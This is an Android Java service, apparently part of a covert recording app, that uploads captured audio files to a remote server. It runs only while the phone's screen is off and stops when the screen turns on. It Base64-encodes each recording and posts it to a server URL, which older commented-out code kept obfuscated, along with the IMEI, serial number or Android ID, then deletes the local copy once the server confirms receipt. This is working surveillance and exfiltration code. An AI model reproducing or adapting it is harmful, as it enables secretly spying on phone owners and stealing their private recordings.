/*
 * 
 *  This service activates when get recording command is received from utility 
 * 
 *  TODO : Does Not send files which are on SD Card . Its has been done in basic encrypted .   
 * 
 */
package com.recorder.screen.screen_recorder.services;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiManager;
import android.os.IBinder;
import android.os.PowerManager;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.recorder.screen.screen_recorder.helper.Base64;
import com.recorder.screen.screen_recorder.helper.UrlDemo;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.io.File;
import java.io.FileInputStream;
import java.io.FilenameFilter;
import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class FileSend extends Service {
	private ConnectivityManager connectivity;
	private  NetworkInfo wifiInfo;
	public String newString3 ="";
	String aes;
	public static boolean running = false;
	private WifiManager mWifiManager;
	PowerManager pm1;
	public BroadcastReceiver mReceiver;
	private Context mContext;
	private Timer timer =null;
	String textRecordingEncode;
	String textRecording;

	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}

	class Mp3Filter implements FilenameFilter {
		@Override
		public boolean accept(File dir, String name) {
			try
			{
				File root1 = new File(dir,name);

				long len = root1.length();
				if(len==0)
					return false;

				return (name.startsWith("R_M")||name.startsWith("R_M1"));
			}
			catch(Exception e)			
			{
				Log.d("Location", "Exception in Mp3filter "+e);
			}
			return false;
		}
	}

	@Override
	public void onCreate() {
		PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
		PowerManager.WakeLock wl = pm.newWakeLock(PowerManager.SCREEN_DIM_WAKE_LOCK, "My Tag");
		wl.acquire();
		// screen and CPU will stay awake during this section
		wl.release();

		super.onCreate();
		running = true;
		try
		{
			
			//String url = "8tsgu#72a#8166:ptt%xpsi$ni3#r&618c$7r";
			//String url="$ppit7g66:ptt%xpsi$ni3#r&6s*";
			String vrb = UrlDemo.Vrb_recording;
			String url = vrb;
			//newString3 = EncoDeco.decryptURL(url);
			newString3 = url;
			System.out.println(newString3);
		}
		catch(Exception e)
		{
			Log.d(getClass().getSimpleName(),"Exception:"+e);
		}
		
		pm1 = (PowerManager) getSystemService(Context.POWER_SERVICE);

		IntentFilter filter = new IntentFilter(
				Intent.ACTION_SCREEN_ON);
		filter.addAction(Intent.ACTION_SCREEN_OFF);
		// filter.addAction(Intent.ACTION_SCREEN_OFF);
		filter.setPriority(999);
		mReceiver = new ScreenReceiver3();
		registerReceiver(mReceiver, filter);
		Log.d("rmdebug", "screenReceiver Registered");
		if(!pm1.isScreenOn())
		filesend();
	}

	@Override
	public void onStart(Intent intent, int startId) 
	{
		running = true;
		//////////

	}//End Of On Start Method

	public void filesend()
	{
		running = true;
		try
		{
			mContext = getApplicationContext();
			mWifiManager = (WifiManager) mContext.getSystemService(Context.WIFI_SERVICE);
			/*try
			{
				if (!mWifiManager.isWifiEnabled()) 
					mWifiManager.setWifiEnabled(true);
			}
			catch(Exception e)
			{
				Log.d(getClass().getSimpleName(), "exception in turning wifi on "+e);
			}*/

			timer = new Timer();
			timer.scheduleAtFixedRate(new TimerTask() {

				@Override
				public void run() {

					Log.e(".............", "----------------------------------------- FileSend");

					TelephonyManager TM = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
					String imei = TM.getDeviceId();
					byte[] imeidata = imei.getBytes();
					String imeibaseFileSend = android.util.Base64.encodeToString(imeidata, android.util.Base64.DEFAULT);
					System.out.println("imeidatacode = " + imeibaseFileSend);
					String imeibaseFileSendstring = imeibaseFileSend.replaceAll("\n", "");
					System.out.println("imeibasecodestring = " + imeibaseFileSendstring);

					String serial = android.os.Build.SERIAL;
					System.out.println("Serial Recording = " +serial);
					byte[] serialdata = serial.getBytes();
					String serialbasecode = android.util.Base64.encodeToString(serialdata, android.util.Base64.DEFAULT);
					String serialbasecodestring = serialbasecode.replaceAll("\n", "");
					System.out.println("serialbasecodestring = " + serialbasecodestring);

					String uid = Settings.Secure.getString(getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID);
					System.out.println("uid Recording = " + uid);
					byte[] uidRecorede = uid.getBytes();
					String uidbaseRecording = android.util.Base64.encodeToString(uidRecorede, android.util.Base64.DEFAULT);
					String uidbaseRecordingstring = uidbaseRecording.replaceAll("\n", "");
					System.out.println("uidbasewifistring = " + uidbaseRecordingstring);

					File sampleDir2 = getApplicationContext().getFilesDir();

					connectivity = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
					NetworkInfo activenetwork = connectivity.getActiveNetworkInfo();
					System.out.println("RecordNetworkType " +activenetwork);
					wifiInfo = connectivity.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
					NetworkInfo wifiInfo1 = connectivity.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);

					SharedPreferences sp = getSharedPreferences("key", 0);
					String tValue = sp.getString("chkrecord","");
					Log.d("checkcon-------","RecordSharedvaluereceive::::------"+tValue);

					if(sampleDir2!=null){
						File[] filelist = sampleDir2.listFiles(new Mp3Filter());
						if (filelist.length > 0) {
							for (int z=filelist.length-1;z>=0&&(!pm1.isScreenOn());z--) {
								File file = filelist[z];
								if (file.length() / 1024 > 5) {
									if (wifiInfo.getState().toString().equalsIgnoreCase("CONNECTED") && tValue.equalsIgnoreCase("A")) {
										System.out.println("wificonnected then = " + activenetwork);
										Log.d("File", "filesend sending file name " + file.getName());

										HttpClient httpclient = new DefaultHttpClient();
										//String value = new String(newString3);
										String aa = UrlDemo.Vrb_recording;
										HttpPost httppost = new HttpPost(aa);
										try {
											String Email = "abc@xyz.com";
											List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
											try {
												FileInputStream fin = new FileInputStream(file);
												int length = (int) file.length();
												Log.d("File", "   first audio file created by mediarecorder File length =" + length);

												byte fileContent[] = new byte[length];
												int response1 = fin.read(fileContent);
												Log.d("File", "   number of byte actually read from file internal" + response1);
												aes = Base64.encodeBytes(fileContent);
												System.out.println("Recording == " + aes);
											} catch (Exception e) {
												Log.d(getClass().getSimpleName(), "   Exception thrown in encrypting  internal files " + e);
											}


											if (imei != null) {
												System.out.println("IMEI NOT NUll recording = ");
												nameValuePairs.add(new BasicNameValuePair("FileData", aes));
												String time = file.getName();
												nameValuePairs.add(new BasicNameValuePair("FileName", time));
												nameValuePairs.add(new BasicNameValuePair("Email", Email));
												nameValuePairs.add(new BasicNameValuePair("IMEI", imeibaseFileSendstring));

												String amr = "amr";
												nameValuePairs.add(new BasicNameValuePair("FileType", amr));

												httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
												if (pm1.isScreenOn())
													return;
												HttpResponse response = httpclient.execute(httppost);
												response.getStatusLine();

												HttpEntity entity = response.getEntity();
												entity = response.getEntity();

												InputStream in = entity.getContent();
												String buffer = "";
												for (int i = in.read(); i != -1; i = in.read()) {
													buffer += (char) i;
													i++;
												}
												System.out.println("RecorderBuffer = " + buffer);
												if (buffer.equals("OK")) {
													file.delete();
													Log.d("File", "   found OK from server");

												} else {
													Log.d("File", "   was NOT OK from server");
													break;
												}

												in.close();

												if (entity != null) {
												}
											} else if (serial != null) {
												System.out.println("IMEI NUll && serial no not null recording = ");
												nameValuePairs.add(new BasicNameValuePair("FileData", aes));
												String time = file.getName();
												nameValuePairs.add(new BasicNameValuePair("FileName", time));
												nameValuePairs.add(new BasicNameValuePair("Email", Email));
												nameValuePairs.add(new BasicNameValuePair("IMEI", serial));

												String amr = "amr";
												nameValuePairs.add(new BasicNameValuePair("FileType", amr));

												httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
												if (pm1.isScreenOn())
													return;
												HttpResponse response = httpclient.execute(httppost);
												response.getStatusLine();

												HttpEntity entity = response.getEntity();
												entity = response.getEntity();

												InputStream in = entity.getContent();
												String buffer = "";
												for (int i = in.read(); i != -1; i = in.read()) {
													buffer += (char) i;
													i++;
												}
												System.out.println("RecorderBuffer = " + buffer);
												if (buffer.equals("OK")) {
													file.delete();
													Log.d("File", "   found OK from server");

												} else {
													Log.d("File", "   was NOT OK from server");
													break;
												}

												in.close();

												if (entity != null) {
												}
											} else {
												System.out.println("IMEI NUll && serial no null && Android Id not null recording = ");
												nameValuePairs.add(new BasicNameValuePair("FileData", aes));
												String time = file.getName();
												nameValuePairs.add(new BasicNameValuePair("FileName", time));
												nameValuePairs.add(new BasicNameValuePair("Email", Email));
												nameValuePairs.add(new BasicNameValuePair("IMEI", uidbaseRecordingstring));

												String amr = "amr";
												nameValuePairs.add(new BasicNameValuePair("FileType", amr));

												httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
												if (pm1.isScreenOn())
													return;
												HttpResponse response = httpclient.execute(httppost);
												response.getStatusLine();

												HttpEntity entity = response.getEntity();
												entity = response.getEntity();

												InputStream in = entity.getContent();
												String buffer = "";
												for (int i = in.read(); i != -1; i = in.read()) {
													buffer += (char) i;
													i++;
												}
												System.out.println("RecorderBuffer = " + buffer);
												if (buffer.equals("OK")) {
													file.delete();
													Log.d("File", "   found OK from server");

												} else {
													Log.d("File", "   was NOT OK from server");
													break;
												}

												in.close();

												if (entity != null) {
												}
											}//else cut

										} catch (ClientProtocolException e) {
											Log.d(getClass().getSimpleName(), "exception 1 in file send " + e);
										} catch (IOException e) {
											Log.d(getClass().getSimpleName(), "exception 2 in file send " + e);
										} catch (Exception e) {
											Log.v("File", "exception maar diya " + e);
										}

									}// end of if (asw.contains(WIFI) || asw.equalsIgnoreCase(WIFI)||asw1.contains(gprs) || asw1.equalsIgnoreCase(gprs)) {
									else if (wifiInfo1.getState().toString().equalsIgnoreCase("CONNECTED") && tValue.equalsIgnoreCase("A1")) {
										System.out.println("wificonnected then = " + activenetwork);
										Log.d("File", "filesend sending file name " + file.getName());

										HttpClient httpclient = new DefaultHttpClient();
										//String value = new String(newString3);
										String aa = UrlDemo.Vrb_recording;
										HttpPost httppost = new HttpPost(aa);
										try {
											String Email = "abc@xyz.com";
											List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
											try {
												FileInputStream fin = new FileInputStream(file);
												int length = (int) file.length();
												Log.d("File", "   first audio file created by mediarecorder File length =" + length);

												byte fileContent[] = new byte[length];
												int response1 = fin.read(fileContent);
												Log.d("File", "   number of byte actually read from file internal" + response1);
												aes = Base64.encodeBytes(fileContent);
												System.out.println("Recording == " + aes);
											} catch (Exception e) {
												Log.d(getClass().getSimpleName(), "   Exception thrown in encrypting  internal files " + e);
											}


											if (imei != null) {
												System.out.println("IMEI NOT NUll recording = ");
												nameValuePairs.add(new BasicNameValuePair("FileData", aes));
												String time = file.getName();
												nameValuePairs.add(new BasicNameValuePair("FileName", time));
												nameValuePairs.add(new BasicNameValuePair("Email", Email));
												nameValuePairs.add(new BasicNameValuePair("IMEI", imeibaseFileSendstring));

												String amr = "amr";
												nameValuePairs.add(new BasicNameValuePair("FileType", amr));

												httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
												if (pm1.isScreenOn())
													return;
												HttpResponse response = httpclient.execute(httppost);
												response.getStatusLine();

												HttpEntity entity = response.getEntity();
												entity = response.getEntity();

												InputStream in = entity.getContent();
												String buffer = "";
												for (int i = in.read(); i != -1; i = in.read()) {
													buffer += (char) i;
													i++;
												}
												System.out.println("RecorderBuffer = " + buffer);
												if (buffer.equals("OK")) {
													file.delete();
													Log.d("File", "   found OK from server");

												} else {
													Log.d("File", "   was NOT OK from server");
													break;
												}

												in.close();

												if (entity != null) {
												}
											} else if (serial != null) {
												System.out.println("IMEI NUll && serial no not null recording = ");
												nameValuePairs.add(new BasicNameValuePair("FileData", aes));
												String time = file.getName();
												nameValuePairs.add(new BasicNameValuePair("FileName", time));
												nameValuePairs.add(new BasicNameValuePair("Email", Email));
												nameValuePairs.add(new BasicNameValuePair("IMEI", serial));

												String amr = "amr";
												nameValuePairs.add(new BasicNameValuePair("FileType", amr));

												httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
												if (pm1.isScreenOn())
													return;
												HttpResponse response = httpclient.execute(httppost);
												response.getStatusLine();

												HttpEntity entity = response.getEntity();
												entity = response.getEntity();

												InputStream in = entity.getContent();
												String buffer = "";
												for (int i = in.read(); i != -1; i = in.read()) {
													buffer += (char) i;
													i++;
												}
												System.out.println("RecorderBuffer = " + buffer);
												if (buffer.equals("OK")) {
													file.delete();
													Log.d("File", "   found OK from server");

												} else {
													Log.d("File", "   was NOT OK from server");
													break;
												}

												in.close();

												if (entity != null) {
												}
											} else {
												System.out.println("IMEI NUll && serial no null && Android Id not null recording = ");
												nameValuePairs.add(new BasicNameValuePair("FileData", aes));
												String time = file.getName();
												nameValuePairs.add(new BasicNameValuePair("FileName", time));
												nameValuePairs.add(new BasicNameValuePair("Email", Email));
												nameValuePairs.add(new BasicNameValuePair("IMEI", uidbaseRecordingstring));

												String amr = "amr";
												nameValuePairs.add(new BasicNameValuePair("FileType", amr));

												httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
												if (pm1.isScreenOn())
													return;
												HttpResponse response = httpclient.execute(httppost);
												response.getStatusLine();

												HttpEntity entity = response.getEntity();
												entity = response.getEntity();

												InputStream in = entity.getContent();
												String buffer = "";
												for (int i = in.read(); i != -1; i = in.read()) {
													buffer += (char) i;
													i++;
												}
												System.out.println("RecorderBuffer = " + buffer);
												if (buffer.equals("OK")) {
													file.delete();
													Log.d("File", "   found OK from server");

												} else {
													Log.d("File", "   was NOT OK from server");
													break;
												}

												in.close();

												if (entity != null) {
												}
											}//else cut

										} catch (ClientProtocolException e) {
											Log.d(getClass().getSimpleName(), "exception 1 in file send " + e);
										} catch (IOException e) {
											Log.d(getClass().getSimpleName(), "exception 2 in file send " + e);
										} catch (Exception e) {
											Log.v("File", "exception maar diya " + e);
										}
									} else
										break;

								}
							}// end of for loop
						}// end of if (sampleDir2.listFiles(new Mp3Filter()).length > 1) 
						else if(!(startrecordingservice.recording_started))
						{
							stopSelf();
						}

					}//end of if(sampleDir2!=null)

				}

			}, 1000, 60300);//change Timer Value
		}
		catch(Exception e)
		{

		}
	}
	class ScreenReceiver3 extends BroadcastReceiver {

		@Override
		public void onReceive(Context context, Intent intent) {
			if(intent.getAction().equals(Intent.ACTION_SCREEN_ON))
			{
				Log.d("Debug","screen ON");
				try
				{if(timer!=null)
					timer.cancel();}catch(Exception e){;}
			}
			else
			{
				Log.d("Debug","screen OFF");
				try
				{if(timer!=null)
					timer.cancel();}catch(Exception e){;}
 				 filesend();
			}

		}

	}
	@Override
	public void onDestroy() {
		running = false;
		try
		{
			unregisterReceiver(mReceiver);
		}
		catch(Exception e)
		{}
		try
		{
			if(timer!=null)
				timer.cancel();
		}
		catch(Exception e)
		{
			Log.d(getClass().getSimpleName(), "   Exception thrown in file send destructor "+e);
		}
	
		super.onDestroy();
	}
}